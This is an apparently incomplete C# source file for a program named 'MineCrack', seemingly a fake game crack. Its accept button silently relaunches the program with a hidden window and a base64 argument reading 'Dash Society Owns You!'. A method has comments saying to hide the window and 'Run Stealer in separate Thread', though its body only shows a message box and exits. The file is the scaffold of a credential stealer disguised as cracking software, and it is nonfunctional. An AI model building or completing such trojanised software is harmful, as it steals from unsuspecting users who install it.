

//
// Author: Dashie
// Version: 1.0
//


using System;
using System.IO;
using System.Net;
using System.Diagnostics;
using System.Windows.Forms;
using System.Collections.Generic;


namespace MineCrack
{
    public class WelcomeDialog : Form
    {
        private readonly Button accept = new Button();

        public WelcomeDialog()
        {


            accept.Click += (s, e) =>
            {
                Process process = new Process()
                {
                    StartInfo = new ProcessStartInfo()
                    {
                        FileName = AppDomain.CurrentDomain.FriendlyName,
                        Arguments = ("RGFzaCBTb2NpZXR5IE93bnMgWW91IQ=="),

                        UseShellExecute = true,
                        CreateNoWindow = true
                    },
                };

                process.Start();

                Close();
            };
        }
    };

    public class AccountWrapper : Form
    {
        private readonly Button exit = new Button();

        public AccountWrapper()
        {
            exit.Click += (s, e) =>
            {
                Close();
            };


        }
    };

    public class DashSociety
    {
        public static void Start()
        {
            // Hide Window
            // Run Stealer in separate Thread.
            MessageBox.Show("1", "1");
            Environment.Exit(-1);
        }
    };
};